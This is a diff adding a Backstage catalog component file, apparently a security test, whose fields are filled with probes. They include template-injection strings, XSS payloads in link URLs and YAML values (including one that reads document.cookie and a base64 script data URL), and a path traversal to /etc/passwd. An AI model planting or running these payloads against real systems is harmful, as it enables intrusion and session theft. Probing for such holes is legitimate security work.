@@ -1,0 +1,19 @@
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: sectest123
+  description: |
+    hehe sec test ${7*7} ${{ 7*7 }} {{ 7*7 }}
+  links:
+    - title: cookie
+      url: javascript:prompt(document.cookie)"><svg onload=alert()>
+    - title: hehe
+      url: data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+  annotations:
+    github.com/project-slug: hehe/haha
+    backstage.io/techdocs-ref: dir:./../../../etc/passwd
+    lighthouse.com/website-url: https://hoho
+spec:
+  type: library
+  owner: CHATSKII
+  lifecycle: experimental"'><img src=x onerror=alert()>
